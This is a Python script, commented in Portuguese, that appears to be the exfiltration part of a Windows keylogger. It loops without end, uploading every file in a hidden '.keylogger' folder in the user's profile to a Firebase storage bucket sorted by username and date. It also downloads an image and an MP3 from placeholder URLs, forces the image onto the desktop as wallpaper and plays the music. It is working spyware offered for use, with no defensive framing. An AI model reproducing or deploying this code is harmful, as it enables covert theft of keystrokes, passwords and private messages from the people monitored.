from time import sleep
import pyrebase
import getpass
import os
from os.path import isfile
import datetime
import requests as req
import struct
import ctypes
from musica import toca
from urllib import request


#config firebase
firebaseConfig = {'apiKey': "coloque as informações da sua conta do firebase",
  'authDomain': "coloque as informações da sua conta do firebase",
  'databaseURL': "coloque as informações da sua conta do firebase",
  'projectId': "coloque as informações da sua conta do firebase",
  'storageBucket': "coloque as informações da sua conta do firebase",
  'messagingSenderId': "coloque as informações da sua conta do firebase",
  'appId': "coloque as informações da sua conta do firebase"}

firebase = pyrebase.initialize_app(firebaseConfig)

storage = firebase.storage()

###########################################

# data atual
data_atual = datetime.date.today()

# pega o usuario do win atual
usuario = getpass.getuser()

# definido local pra salvar no firebase
locald = f'{usuario}/{data_atual}'

# definir a localização do arquivo log
path_log = f"C:/Users/{usuario}/.keylogger/"

# local da musica
musica = f'C:\\Users\\{usuario}\\nome_da_musica.mp3'

while True:
    
    # função envia o log
    def envia(caminho, pasta):
        for c in os.listdir(caminho):
            #if c.endswith(".txt"):
            os.chdir(caminho)
            if isfile(c):
                local = f'{pasta}/{c}'
                #print(f"pasta {local}")
                storage.child(local).put(c)


    # baixa a img
    def img():
        url = 'url da imagem .jpg'  # <- url da imagem
        file = req.get(url, allow_redirects=True)
        open(f'C:\\Users\\{usuario}\\nome_da_imagem.jpg', "wb").write(file.content)
    
    
    # baixa a musica
    def song():
        file_url = 'url da musica .mp3' # <- url da musica
        file = f'C:\\Users\\{usuario}\\nome_da_musica.mp3'
        request.urlretrieve(file_url , file )


    # troca o papel de parede
    sleep(1.5)
    SPI_SETDESKWALLPAPER = 20
    WALLPAPER_PATH = f'C:\\Users\\{usuario}\\mito.jpg'


    def is_64_windows():
        """Find out how many bits is OS. """
        return struct.calcsize('P') * 8 == 64


    def get_sys_parameters_info():
        """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
        return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
            else ctypes.windll.user32.SystemParametersInfoA


    def change_wallpaper():
        sys_parameters_info = get_sys_parameters_info()
        r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)

        # When the SPI_SETDESKWALLPAPER flag is used,
        # SystemParametersInfo returns TRUE
        # unless there is an error (like when the specified file doesn't exist).
        if not r:
            print(ctypes.WinError())
    
    try:
        envia(path_log, locald)
        img()
        song()
        change_wallpaper()
        toca(musica)
    except:
        change_wallpaper()
        toca(musica)
    